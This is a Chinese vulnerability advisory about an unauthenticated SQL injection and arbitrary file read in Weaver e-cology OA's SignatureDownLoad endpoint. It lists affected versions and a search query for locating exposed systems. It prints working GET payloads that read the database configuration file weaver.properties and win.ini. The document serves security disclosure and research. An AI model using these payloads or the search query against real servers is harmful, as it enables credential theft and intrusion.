---
source: "7hang《安全研究 - 泛微OA》（博客园，wooyun-2016-0198158）"
---

# 泛微OA SignatureDownLoad 任意文件读取漏洞

## 漏洞描述

泛微 e-cology 的 `weaver.file.SignatureDownLoad` 类中存在缺陷（缺陷编号 wooyun-2016-0198158）：

1. **SQL注入**：`markId` 参数未做过滤，可直接拼接 SQL 语句；
2. **任意文件读取**：注入的查询结果被后端直接作为文件路径读取，攻击者通过 UNION SELECT 注入任意文件路径即可读取服务器上的文件；另据原文，`markPath` 参数也可控，可直接指定读取路径。

攻击者无需登录即可利用该漏洞读取服务器敏感文件（如数据库配置文件）。

## 漏洞影响

```
泛微 e-cology（受影响版本包括 8.100.0531、7.100.0331、5.000.0327 等）
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

通过 `markId` 参数的 SQL 注入，将目标文件路径注入为查询结果，后端将其作为文件路径读取：

```
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
```

响应中将返回 `weaver.properties` 文件的内容。替换路径即可读取任意文件，例如：

```
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 HTTP/1.1
```
